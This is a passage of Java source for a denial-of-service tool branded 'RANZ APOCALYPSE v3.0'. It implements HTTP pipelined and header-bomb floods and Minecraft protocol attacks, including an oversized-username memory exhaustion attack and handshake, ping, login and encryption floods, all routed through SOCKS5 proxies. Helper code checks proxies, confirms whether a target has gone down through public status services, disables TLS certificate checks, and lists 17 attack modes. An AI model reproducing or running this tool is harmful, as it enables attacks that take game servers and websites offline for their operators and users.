                String host = t + ":" + p;
                StringBuilder pipe = new StringBuilder();
                for (int i = 0; i < 20; i++) {
                    pipe.append("GET /").append(rnd.nextInt(Integer.MAX_VALUE)).append(" HTTP/1.1\r\n")
                        .append("Host: ").append(host).append("\r\n")
                        .append("User-Agent: ").append(getRandomUA()).append("\r\n")
                        .append("Connection: keep-alive\r\n\r\n");
                }
                byte[] data = pipe.toString().getBytes();
                o.write(data);
                o.flush();
                pps.incrementAndGet();
                bps.addAndGet(data.length);
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // Mode 11: HTTP Header Bomb via SOCKS5 - massive headers to exhaust memory
    static void httpHeaderBomb(String t, int p) {
        StringBuilder bigHeaders = new StringBuilder();
        for (int i = 0; i < 200; i++) {
            bigHeaders.append("X-Bomb-").append(i).append(": ");
            for (int j = 0; j < 100; j++) bigHeaders.append("A");
            bigHeaders.append("\r\n");
        }
        byte[] headerBytes = bigHeaders.toString().getBytes();
        while (run) {
            try (Socket s = openSocket(t, p, 3000)) {
                conn.incrementAndGet();
                OutputStream o = s.getOutputStream();
                String req = "GET /" + rnd.nextInt(Integer.MAX_VALUE) + " HTTP/1.1\r\n"
                        + "Host: " + t + ":" + p + "\r\n"
                        + "User-Agent: " + getRandomUA() + "\r\n";
                o.write(req.getBytes());
                o.write(headerBytes);
                o.write("Connection: close\r\n\r\n".getBytes());
                o.flush();
                pps.incrementAndGet();
                bps.addAndGet(req.length() + headerBytes.length + 20);
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // ================================================================
    // MINECRAFT PROTOCOL ENGINES
    // ================================================================

    // Mode 12: MC Bot OOM via SOCKS5 - 1.5MB username to trigger OutOfMemoryError
    static void mcBotOOM(String t, int p) {
        while (run) {
            try (Socket s = openSocket(t, p, 5000)) {
                conn.incrementAndGet();
                DataOutputStream o = new DataOutputStream(new BufferedOutputStream(s.getOutputStream()));
                ByteArrayOutputStream b = new ByteArrayOutputStream();
                DataOutputStream w = new DataOutputStream(b);
                w.writeByte(0x00);
                vi(w, 767);
                vi(w, MC_OOM_STR.length());
                w.write(MC_OOM_STR.getBytes(StandardCharsets.UTF_8));
                w.writeShort(p);
                w.writeByte(0x02);
                vi(o, b.size());
                o.write(b.toByteArray());
                b.reset();
                w.writeByte(0x00);
                vi(w, MC_OOM_STR.length());
                w.write(MC_OOM_STR.getBytes(StandardCharsets.UTF_8));
                vi(o, b.size());
                o.write(b.toByteArray());
                o.flush();
                pps.incrementAndGet();
                bps.addAndGet(MC_OOM_STR.length() * 2);
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // Mode 13: MC Handshake Flood via SOCKS5 - rapid handshake spam
    static void mcHandshakeFlood(String t, int p) {
        while (run) {
            try (Socket s = openSocket(t, p, 5000)) {
                conn.incrementAndGet();
                DataOutputStream o = new DataOutputStream(new BufferedOutputStream(s.getOutputStream()));
                for (int i = 0; i < 100 && run; i++) {
                    ByteArrayOutputStream b = new ByteArrayOutputStream();
                    DataOutputStream w = new DataOutputStream(b);
                    w.writeByte(0x00);
                    vi(w, rnd.nextInt(1000));
                    String name = "Bot" + rnd.nextInt(Integer.MAX_VALUE);
                    vi(w, name.length());
                    w.write(name.getBytes(StandardCharsets.UTF_8));
                    w.writeShort(p);
                    w.writeByte(rnd.nextInt(3));
                    vi(o, b.size());
                    o.write(b.toByteArray());
                    o.flush();
                    pps.incrementAndGet();
                    bps.addAndGet(50);
                }
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // Mode 14: MC Ping Flood via SOCKS5 - server list ping spam
    static void mcPingFlood(String t, int p) {
        while (run) {
            try (Socket s = openSocket(t, p, 5000)) {
                conn.incrementAndGet();
                DataOutputStream o = new DataOutputStream(new BufferedOutputStream(s.getOutputStream()));
                ByteArrayOutputStream b = new ByteArrayOutputStream();
                DataOutputStream w = new DataOutputStream(b);
                w.writeByte(0x00);
                vi(w, 767);
                vi(w, t.length());
                w.write(t.getBytes(StandardCharsets.UTF_8));
                w.writeShort(p);
                w.writeByte(0x01);
                vi(o, b.size());
                o.write(b.toByteArray());
                b.reset();
                w.writeByte(0x00);
                vi(o, b.size());
                o.write(b.toByteArray());
                o.flush();
                pps.incrementAndGet();
                bps.addAndGet(100);
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // Mode 15: MC Login Flood via SOCKS5 - hold connection for 30s
    static void mcLoginFlood(String t, int p) {
        while (run) {
            try (Socket s = openSocket(t, p, 30000)) {
                conn.incrementAndGet();
                DataOutputStream o = new DataOutputStream(new BufferedOutputStream(s.getOutputStream()));
                ByteArrayOutputStream b = new ByteArrayOutputStream();
                DataOutputStream w = new DataOutputStream(b);
                w.writeByte(0x00);
                vi(w, 767);
                vi(w, t.length());
                w.write(t.getBytes(StandardCharsets.UTF_8));
                w.writeShort(p);
                w.writeByte(0x02);
                vi(o, b.size());
                o.write(b.toByteArray());
                b.reset();
                w.writeByte(0x00);
                String name = "Flood_" + rnd.nextInt(99999);
                vi(w, name.length());
                w.write(name.getBytes(StandardCharsets.UTF_8));
                vi(o, b.size());
                o.write(b.toByteArray());
                o.flush();
                pps.incrementAndGet();
                bps.addAndGet(200);
                try { Thread.sleep(25000); } catch (Exception e) {}
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // Mode 16: MC Encryption Flood via SOCKS5 - spam garbage encryption responses
    static void mcEncryptionFlood(String t, int p) {
        while (run) {
            try (Socket s = openSocket(t, p, 5000)) {
                conn.incrementAndGet();
                DataOutputStream o = new DataOutputStream(new BufferedOutputStream(s.getOutputStream()));
                ByteArrayOutputStream b = new ByteArrayOutputStream();
                DataOutputStream w = new DataOutputStream(b);
                w.writeByte(0x00);
                vi(w, 767);
                vi(w, t.length());
                w.write(t.getBytes(StandardCharsets.UTF_8));
                w.writeShort(p);
                w.writeByte(0x02);
                vi(o, b.size());
                o.write(b.toByteArray());
                b.reset();
                w.writeByte(0x00);
                String name = "Bot_" + rnd.nextInt(99999);
                vi(w, name.length());
                w.write(name.getBytes(StandardCharsets.UTF_8));
                vi(o, b.size());
                o.write(b.toByteArray());
                o.flush();
                for (int i = 0; i < 50 && run; i++) {
                    b.reset();
                    w.writeByte(0x01);
                    byte[] secret = new byte[128];
                    rnd.nextBytes(secret);
                    vi(w, secret.length);
                    w.write(secret);
                    byte[] token = new byte[128];
                    rnd.nextBytes(token);
                    vi(w, token.length);
                    w.write(token);
                    vi(o, b.size());
                    o.write(b.toByteArray());
                    o.flush();
                    pps.incrementAndGet();
                    bps.addAndGet(300);
                }
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // ================================================================
    // TITLE SETTER (PuTTY / xterm / Terminal)
    // ================================================================
    static void setTitle(String title) {
        System.out.print("\033]0;" + title + "\007");
        System.out.flush();
    }

    // ================================================================
    // ANIMATED BANNER
    // ================================================================
    static String getAnimatedBanner(int frame) {
        String[] banners = {
            YLW + B + "  R A N Z   T O O L S" + R + "  " + RED + BLK + ">>> ATTACK SENT <<<" + R,
            BYLW + B + "  R A N Z   T O O L S" + R + "  " + BRED + BLK + ">>> ATTACK SENT <<<" + R,
            MAG + B + "  R A N Z   T O O L S" + R + "  " + RED + B + ">>> ATTACK SENT <<<" + R,
            BMAG + B + "  R A N Z   T O O L S" + R + "  " + BRED + B + ">>> ATTACK SENT <<<" + R,
        };
        return banners[frame % banners.length];
    }

    // ================================================================
    // SERVER CHECKER
    // ================================================================
    static void checkServer(String ip, int port) {
        System.out.println(CYN + "Querying mcstatus.io for " + ip + ":" + port + "..." + R);
        try {
            URL u = new URL("https://api.mcstatus.io/v2/status/java/" + ip + ":" + port);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            c.setRequestMethod("GET");
            StringBuilder resp = new StringBuilder();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()))) {
                String l; while ((l = r.readLine()) != null) resp.append(l);
            }
            String data = resp.toString();
            if (data.contains("\"online\":true")) {
                String pOnline = extract(data, "\"players\":{\"online\":", ",");
                String pMax = extract(data, "\"max\":", "}");
                String ver = extract(data, "\"name_clean\":\"", "\"");
                String latency = extract(data, "\"latency\":", ",");
                String motd = extract(data, "\"clean\":\"", "\"");
                System.out.println(GRN + "+----------------------------------------------+" + R);
                System.out.println(GRN + "|" + R + B + " SERVER STATUS: " + GRN + "ONLINE                          " + R + GRN + "|" + R);
                System.out.println(GRN + "+----------------------------------------------+" + R);
                System.out.println(GRN + "|" + R + " IP      : " + YLW + ip + ":" + port + R + getSpaces(33 - (ip + ":" + port).length()) + GRN + "|" + R);
                System.out.println(GRN + "|" + R + " Players : " + CYN + pOnline + "/" + pMax + R + getSpaces(33 - (pOnline + "/" + pMax).length()) + GRN + "|" + R);
                System.out.println(GRN + "|" + R + " Version : " + MAG + (ver != null ? ver : "Unknown") + R + getSpaces(33 - (ver != null ? ver : "Unknown").length()) + GRN + "|" + R);
                System.out.println(GRN + "|" + R + " Latency : " + RED + latency + "ms" + R + getSpaces(33 - (latency + "ms").length()) + GRN + "|" + R);
                if (motd != null && !motd.isEmpty()) {
                    String sm = motd.length() > 30 ? motd.substring(0, 30) + "..." : motd;
                    System.out.println(GRN + "|" + R + " MOTD    : " + BLU + sm + R + getSpaces(33 - sm.length()) + GRN + "|" + R);
                }
                System.out.println(GRN + "+----------------------------------------------+" + R);
            } else {
                System.out.println(RED + "+----------------------------------------------+" + R);
                System.out.println(RED + "|" + R + B + " SERVER STATUS: " + RED + "OFFLINE                         " + R + RED + "|" + R);
                System.out.println(RED + "+----------------------------------------------+" + R);
                System.out.println(RED + "|" + R + " Target  : " + YLW + ip + ":" + port + R + getSpaces(33 - (ip + ":" + port).length()) + RED + "|" + R);
                System.out.println(RED + "+----------------------------------------------+" + R);
            }
        } catch (Exception e) {
            System.out.println(RED + "Error: " + e.getMessage() + R);
        }
    }

    static String getSpaces(int n) { return n > 0 ? " ".repeat(n) : ""; }

    // ================================================================
    // WEB HOST CHECKER (check-host.net API)
    // ================================================================
    static void checkWebHost(String host, String type, int port) {
        String endpoint;
        String hostParam = host;
        if (type.equals("tcp") || type.equals("udp")) {
            hostParam = host + ":" + port;
        } else if (type.equals("http") || type.equals("https")) {
            if (!host.startsWith("http://") && !host.startsWith("https://")) {
                hostParam = (type.equals("https") ? "https://" : "http://") + host;
            }
        }

        switch (type) {
            case "tcp": endpoint = "check-tcp"; break;
            case "udp": endpoint = "check-udp"; break;
            case "http": endpoint = "check-http"; hostParam = hostParam; break;
            case "https": endpoint = "check-http"; break;
            case "ping": endpoint = "check-ping"; break;
            default:
                System.out.println(RED + "Invalid type. Use: tcp, udp, http, ping" + R);
                return;
        }

        System.out.println(CYN + "Querying check-host.net [" + endpoint + "] for " + hostParam + "..." + R);
        try {
            String urlStr = "https://check-host.net/" + endpoint + "?host=" + URLEncoder.encode(hostParam, StandardCharsets.UTF_8) + "&max_nodes=15";
            URL u = new URL(urlStr);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(8000);
            c.setReadTimeout(8000);
            c.setRequestMethod("GET");
            c.setRequestProperty("Accept", "application/json");

            StringBuilder resp = new StringBuilder();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()))) {
                String l; while ((l = r.readLine()) != null) resp.append(l);
            }
            String data = resp.toString();
            String reqId = extract(data, "\"request_id\":\"", "\"");
            if (reqId == null || reqId.equals("0") || reqId.isEmpty()) {
                System.out.println(RED + "Failed to get request_id from check-host.net" + R);
                System.out.println(GRY + "Response: " + data.substring(0, Math.min(200, data.length())) + R);
                return;
            }
            System.out.println(YLW + "  Request ID: " + reqId + R);
            System.out.println(GRY + "  Waiting for global nodes to respond (10s)..." + R);
            Thread.sleep(10000);

            // Fetch results
            URL ru = new URL("https://check-host.net/check-result/" + reqId);
            HttpURLConnection rc = (HttpURLConnection) ru.openConnection();
            rc.setConnectTimeout(8000);
            rc.setReadTimeout(8000);
            rc.setRequestMethod("GET");
            rc.setRequestProperty("Accept", "application/json");
            StringBuilder rresp = new StringBuilder();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(rc.getInputStream()))) {
                String l; while ((l = r.readLine()) != null) rresp.append(l);
            }
            String rdata = rresp.toString();

            // Parse nodes and results
            List<String[]> results = parseCheckHostResults(rdata, type);
            if (results.isEmpty()) {
                System.out.println(YLW + "  No results yet. Try again later." + R);
                return;
            }

            int okCount = 0, failCount = 0;
            for (String[] r : results) {
                if (r[2].equalsIgnoreCase("OK")) okCount++;
                else failCount++;
            }

            System.out.println(GRN + "+----------------------------------------------------+" + R);
            System.out.println(GRN + "|" + R + B + " CHECK-HOST.NET - " + type.toUpperCase() + " CHECK                " + R + GRN + "|" + R);
            System.out.println(GRN + "+----------------------------------------------------+" + R);
            System.out.println(GRN + "|" + R + " Target  : " + YLW + String.format("%-37s", hostParam) + GRN + "|" + R);
            System.out.println(GRN + "|" + R + " Nodes   : " + CYN + String.format("%-37s", results.size()) + GRN + "|" + R);
            System.out.println(GRN + "|" + R + " OK      : " + GRN + B + String.format("%-37s", okCount) + R + GRN + "|" + R);
            System.out.println(GRN + "|" + R + " Failed  : " + RED + B + String.format("%-37s", failCount) + R + GRN + "|" + R);
            System.out.println(GRN + "+----------------------------------------------------+" + R);
            for (String[] r : results) {
                String color = r[2].equalsIgnoreCase("OK") ? GRN : RED;
                String status = r[2].equalsIgnoreCase("OK") ? "[\u2713] OK    " : "[X] FAIL   ";
                String detail = r[1].length() > 25 ? r[1].substring(0, 25) : r[1];
                System.out.println(GRN + "|" + R + " " + color + status + R + CYN + String.format("%-12s", r[0]) + R + GRY + " | " + R + color + String.format("%-18s", detail) + R + GRN + "|" + R);
            }
            System.out.println(GRN + "+----------------------------------------------------+" + R);
            if (okCount == 0) {
                System.out.println(RED + B + "  [!] TARGET UNREACHABLE FROM ALL GLOBAL NODES" + R);
            } else if (failCount > okCount) {
                System.out.println(YLW + B + "  [!] TARGET PARTIALLY DOWN (" + failCount + "/" + results.size() + " nodes failed)" + R);
            } else {
                System.out.println(GRN + B + "  [\u2713] TARGET REACHABLE FROM MOST GLOBAL NODES" + R);
            }
        } catch (Exception e) {
            System.out.println(RED + "Error: " + e.getMessage() + R);
        }
    }

    static List<String[]> parseCheckHostResults(String data, String type) {
        List<String[]> results = new ArrayList<>();
        // data format: {"node1": [["1.2.3.4", "OK", "USA"]], "node2": null, ...}
        // Simpler approach: extract pairs of "node_name": <array or null>
        Pattern nodePattern = Pattern.compile("\"([a-zA-Z0-9_.\\-]+)\":\\s*(\\[[^\\]]*\\]|null)");
        Matcher m = nodePattern.matcher(data);
        while (m.find()) {
            String node = m.group(1);
            String value = m.group(2);
            if (value.equals("null") || value.isEmpty()) {
                results.add(new String[]{node, "timeout", "FAIL"});
            } else {
                // Try to extract useful info based on type
                String status = "OK";
                String detail = "";
                if (type.equals("ping")) {
                    // [["1.2.3.4", [["100","OK"],["90","OK"]]]]
                    Pattern okP = Pattern.compile("\\[\"([0-9.]+)\",\"OK\"\\]");
                    Matcher m2 = okP.matcher(value);
                    int pings = 0; double total = 0;
                    while (m2.find()) {
                        try { total += Double.parseDouble(m2.group(1)); pings++; } catch (Exception e) {}
                    }
                    detail = pings > 0 ? String.format("%.0fms", total / pings) : "timeout";
                    status = pings > 0 ? "OK" : "FAIL";
                } else if (type.equals("tcp") || type.equals("udp")) {
                    // [["1.2.3.4", "OK", "USA", 0.123]]
                    if (value.contains("\"OK\"")) {
                        Pattern timeP = Pattern.compile(",\\s*([0-9.]+)\\s*\\]");
                        Matcher m3 = timeP.matcher(value);
                        if (m3.find()) {
                            try { detail = String.format("%.0fms", Double.parseDouble(m3.group(1)) * 1000); }
                            catch (Exception e) { detail = "OK"; }
                        } else { detail = "OK"; }
                        status = "OK";
                    } else {
                        detail = "refused";
                        status = "FAIL";
                    }
                } else if (type.equals("http") || type.equals("https")) {
                    // [["1.2.3.4", 200, 0.5, "OK"]]
                    Pattern codeP = Pattern.compile(",\\s*(\\d{3})\\s*,");
                    Matcher m4 = codeP.matcher(value);
                    if (m4.find()) {
                        String code = m4.group(1);
                        detail = "HTTP " + code;
                        status = code.startsWith("2") || code.startsWith("3") ? "OK" : "FAIL";
                    } else {
                        detail = value.contains("OK") ? "OK" : "fail";
                        status = value.contains("OK") ? "OK" : "FAIL";
                    }
                }
                results.add(new String[]{node, detail, status});
            }
        }
        return results;
    }

    // ================================================================
    // PROXY MANAGER
    // ================================================================
    static void checkProxies() {
        if (!useProxy) { System.out.println(RED + "Enable proxy first: 'proxy on'" + R); return; }
        proxies.clear();
        List<String> raw = new ArrayList<>();
        try { raw = Files.readAllLines(Paths.get("proxy.txt")); }
        catch (Exception e) { System.out.println(RED + "proxy.txt not found." + R); return; }
        System.out.print(CYN + "Checking " + raw.size() + " proxies " + R);
        ExecutorService ex = Executors.newFixedThreadPool(200);
        for (String line : raw) {
            Matcher m = pReg.matcher(line);
            if (m.find()) {
                String pStr = m.group();
                ex.submit(() -> {
                    try (Socket s = new Socket(new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(pStr.split(":")[0], Integer.parseInt(pStr.split(":")[1]))))) {
                        s.connect(new InetSocketAddress("1.1.1.1", 53), 2000);
                        proxies.add(pStr);
                        System.out.print(GRN + "\u2588" + R);
                    } catch (Exception e) { System.out.print(RED + "X" + R); }
                });
            }
        }
        ex.shutdown();
        try { ex.awaitTermination(1, TimeUnit.MINUTES); } catch (Exception e) {}
        System.out.println("\n" + GRN + B + "[\u2713] Active: " + proxies.size() + R);
    }

    static Proxy getProxy() {
        if (proxies.isEmpty()) return Proxy.NO_PROXY;
        String[] p = proxies.get(rnd.nextInt(proxies.size())).split(":");
        return new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(p[0], Integer.parseInt(p[1])));
    }

    // ================================================================
    // UTILS
    // ================================================================
    static void initDirectBuffers() {
        buf_64KB = ByteBuffer.allocateDirect(P_64KB.length);
        buf_8KB = ByteBuffer.allocateDirect(P_8KB.length);
        buf_1KB = ByteBuffer.allocateDirect(P_1KB.length);
        buf_64B = ByteBuffer.allocateDirect(P_64B.length);
    }

    static void vi(DataOutputStream o, int v) throws IOException {
        while ((v & 0xFFFFFF80) != 0) { o.writeByte((v & 0x7F) | 0x80); v >>>= 7; }
        o.writeByte(v);
    }

    static void setupSSL() {
        try {
            javax.net.ssl.SSLContext ctx = javax.net.ssl.SSLContext.getInstance("TLS");
            ctx.init(null, new javax.net.ssl.TrustManager[]{new javax.net.ssl.X509TrustManager() {
                public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
            }}, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
        } catch (Exception e) {}
    }

    static String extract(String t, String s, String e) {
        int i = t.indexOf(s);
        if (i == -1) return "0";
        i += s.length();
        int j = t.indexOf(e, i);
        return j == -1 ? "0" : t.substring(i, j);
    }

    static String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
        "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
        "curl/8.5.0", "Wget/1.21.4", "python-requests/2.31.0", "Go-http-client/1.1"
    };

    static String getRandomUA() { return USER_AGENTS[rnd.nextInt(USER_AGENTS.length)]; }

    static String getModeName(int m) {
        if (m >= 1 && m < MODE_NAMES.length) return MODE_NAMES[m];
        return "Unknown";
    }

    // ================================================================
    // UI: HELP / MODES
    // ================================================================
    static void printHelp() {
        System.out.println(CYN + "\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510" + R);
        System.out.println(CYN + "\u2502" + R + B + "         RANZ APOCALYPSE v3.0 - COMMANDS         " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + GRY + "    Author: ranz-coder | ranzzawok.my.id        " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "proxy on " + R + GRY + "- Enable SOCKS5 Proxy Mode       " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "proxy off" + R + GRY + "- Disable Proxy (Direct)         " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "check    " + R + GRY + "- Test proxy.txt connections      " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "check <ip>" + R + GRY + " - Check MC Server Status       " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "checkweb <h>" + R + GRY + "- Check web via check-host.net " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "modes    " + R + GRY + "- List all attack modes          " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "banner   " + R + GRY + "- Re-show boot banner            " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "clear    " + R + GRY + "- Clear screen                   " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + YLW + "exit      " + R + GRY + "- Close program                 " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518" + R);
        System.out.println(CYN + "\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510" + R);
        System.out.println(CYN + "\u2502" + R + B + "              ATTACK FORMAT                    " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524" + R);
        System.out.println(CYN + "\u2502" + R + " " + GRN + "<mode> <ip> <port> <sec> <threads>" + R + "          " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " Example: " + MAG + "17 127.0.0.1 25565 60 3000" + R + "            " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518" + R);
    }

    static void printModes() {
        System.out.println(CYN + "\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510" + R);
        System.out.println(CYN + "\u2502" + R + B + "           ATTACK MODES (17 Total)             " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524" + R);
        System.out.println(CYN + "\u2502" + R + B + " --- LAYER 4 (Network) ---                    " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "1 " + R + "= TCP Flood NIO (64KB, Multi-Conn)     " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "2 " + R + "= TCP Connection Flood (Churn)          " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "3 " + R + "= UDP Flood Multi-Socket (10x, 8KB)    " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "4 " + R + "= UDP Micro Packet (64B, Max PPS)      " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + B + " --- LAYER 7 (HTTP/HTTPS) ---                 " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "5 " + R + "= HTTP GET Keep-Alive (Reuse)           " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "6 " + R + "= HTTPS GET Keep-Alive                  " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "7 " + R + "= HTTP POST Flood (Keep-Alive)          " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "8 " + R + "= HTTPS POST Flood                      " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "9 " + R + "= Slowloris (Apache/Nginx Killer)       " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "10" + R + "= HTTP Pipelined Flood (20x Pipeline)   " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "11" + R + "= HTTP Header Bomb (20KB Headers)      " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + B + " --- MINECRAFT PROTOCOL ---                   " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "12" + R + "= MC Bot OOM (1.5MB Username)           " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "13" + R + "= MC Handshake Flood                    " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "14" + R + "= MC Ping Flood                         " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "15" + R + "= MC Login Flood (30s Hold)             " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + MAG + "16" + R + "= MC Encryption Flood (Garbage)         " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + B + " --- ULTIMATE ---                             " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2502" + R + " " + BRED + B + "17" + R + "= " + BRED + B + "MIXED APOCALYPSE (ALL VECTORS)      " + CYN + "\u2502" + R);
        System.out.println(CYN + "\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518" + R);
        System.out.println(GRY + "  Usage: <mode> <ip> <port> <sec> <threads>" + R);
    }

    // ================================================================
    // ANIMATIONS
    // ================================================================
    static void bootAnimation() throws Exception {
        setTitle("RANZ TOOLS v3.0 - Loading...");
        System.out.print("\033[H\033[2J");
        // Animated boot banner
        String[] bannerLines = {
            " \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588         \u2588\u2588\u2588\u2588\u2588\u2588 ",
